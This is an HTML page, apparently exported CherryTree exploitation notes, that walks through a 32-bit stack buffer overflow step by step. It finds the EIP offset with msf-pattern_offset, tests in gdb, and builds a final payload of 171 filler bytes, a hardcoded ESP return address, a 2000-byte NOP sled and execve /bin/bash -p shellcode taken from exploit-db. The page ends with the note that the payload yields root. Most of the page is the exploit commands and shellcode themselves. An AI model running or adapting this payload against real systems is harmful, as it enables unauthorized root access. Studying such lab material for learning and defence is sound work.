<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>5.1.3 Find the OFFSET_VALUE + EIP_VALUE + NOPS + BASH_SHELL_CODE</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
  <script></script>
</head>
<body><div class="page"><h1 class="title">5.1.3 Find the OFFSET_VALUE + EIP_VALUE + NOPS + BASH_SHELL_CODE</h1><br/><br /><br />1. Use the <code>0x41376641</code> value to find the offset<br />    <div class="codebox"><div class="codebox"><span style="color:#6a5acd;font-weight:400">$msf</span>-pattern_offset&nbsp;-l&nbsp;300&nbsp;-q&nbsp;0x41376641</div></div><br /><br />	<span style="color:#ffa500;">Output:</span> <br />    <img src="images/886-1.png" alt="images/886-1.png" /><br /><br />    <strong>OFFSET VALUE</strong> <strong><code>171</code></strong>.<br /><br />2. Get the <a href="https://en.wikipedia.org/wiki/X86#32-bit">EIP</a> value<br />    <div class="codebox"><div class="codebox"><span style="color:#a52a2a;font-weight:700">(</span>gdb<span style="color:#a52a2a;font-weight:700">)</span>&nbsp;r&nbsp;$<span style="color:#a52a2a;font-weight:700">(</span>python&nbsp;-c&nbsp;<span style="color:#ff00ff;font-weight:400">'print("A"*171&nbsp;+&nbsp;"B"&nbsp;*&nbsp;5&nbsp;+&nbsp;"\x90"*&nbsp;2000&nbsp;)'</span><span style="color:#a52a2a;font-weight:700">)</span><br /><br /></div></div><br /><br />	<span style="color:#ffa500;">Output:</span> <br />    <img src="images/886-2.png" alt="images/886-2.png" /><br /><br />    <strong>EIP VALUE </strong><strong><code>0x42424242</code></strong><br /><br />3. Take a look at the registers.<br />    <div class="codebox"><div class="codebox"><span style="color:#a52a2a;font-weight:700">(</span>gdb<span style="color:#a52a2a;font-weight:700">)</span>&nbsp;<span style="color:#a52a2a;font-weight:700">info</span>&nbsp;r<br /></div></div><br /><br />	<span style="color:#ffa500;">Output:</span> <br />    <img src="images/886-3.png" alt="images/886-3.png" /><br /><br />3. Examined the value of <a href="https://en.wikipedia.org/wiki/X86#32-bit">ESP</a> register. Since this is <a href="https://en.wikipedia.org/wiki/Endianness#Overview">little endian</a>, it will be written in reverse. <code>x/s $esp</code>.<br />    <div class="codebox"><div class="codebox"><span style="color:#a52a2a;font-weight:700">(</span>gdb<span style="color:#a52a2a;font-weight:700">)</span>&nbsp;r&nbsp;$<span style="color:#a52a2a;font-weight:700">(</span>python&nbsp;-c&nbsp;<span style="color:#ff00ff;font-weight:400">'print("A"*171&nbsp;+&nbsp;"\xf0\xcd\xff\xff"&nbsp;+&nbsp;"\x90"&nbsp;*&nbsp;2000&nbsp;)'</span><span style="color:#a52a2a;font-weight:700">)</span><br /><br /></div></div><br /><br />	<span style="color:#ffa500;">Output:</span> <br />    <img src="images/886-4.png" alt="images/886-4.png" /><br /><br />    <br />    <div class="codebox"><div class="codebox"><span style="color:#a52a2a;font-weight:700">(</span>gdb<span style="color:#a52a2a;font-weight:700">)</span>&nbsp;&nbsp;x<span style="color:#a52a2a;font-weight:700">/</span>s&nbsp;<span style="color:#6a5acd;font-weight:400">$esp</span></div></div><br /><br />	<span style="color:#ffa500;">Output:</span> <br />    <img src="images/886-5.png" alt="images/886-5.png" /><br /><br />    <strong>ESP </strong><strong><code><span style="color:#000000;">\xf0\xcd\xff\xff</span></code></strong><br /><br /><br />    <strong>NOPS </strong><strong><code>"\x90" * 2000</code></strong><br /><br />4. “bash” shell code with our malicious code from <a href="https://www.exploit-db.com/shellcodes/13697">https://www.exploit-db.com/shellcodes/13697</a>.<br />  <br /><strong>   BASH SHELL CODE  </strong><strong><code>"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"</code></strong><strong><br /></strong><br />5. <strong>PAYLOAD</strong><br />    payload = <strong>OFFSET_VALUE + EIP_VALUE + NOPS + BASH_SHELL_CODE</strong><br /><br />  <code> r $(python -c 'print("A"*171 + "\xf0\xcd\xff\xff" + "\x90" * 2000 + "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80")')</code><br /><br /><br /><br />6. Run the payload in “gdb”.<br />    <div class="codebox"><div class="codebox"><span style="color:#a52a2a;font-weight:700">(</span>gdb<span style="color:#a52a2a;font-weight:700">)</span>&nbsp;r&nbsp;$<span style="color:#a52a2a;font-weight:700">(</span>python&nbsp;-c&nbsp;<span style="color:#ff00ff;font-weight:400">'print("A"*171&nbsp;+&nbsp;"\xf0\xcd\xff\xff"&nbsp;+&nbsp;"\x90"&nbsp;*&nbsp;2000&nbsp;+&nbsp;"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80")'</span><span style="color:#a52a2a;font-weight:700">)</span></div></div><br /><br />	<span style="color:#ffa500;">Output:</span> <br />    <img src="images/886-6.png" alt="images/886-6.png" /><br /><br />    You're "root:<br /><p align="center"><img src="images/home.png" height="22" width="22">  <a href="index.html">Index</a></p></div></body></html>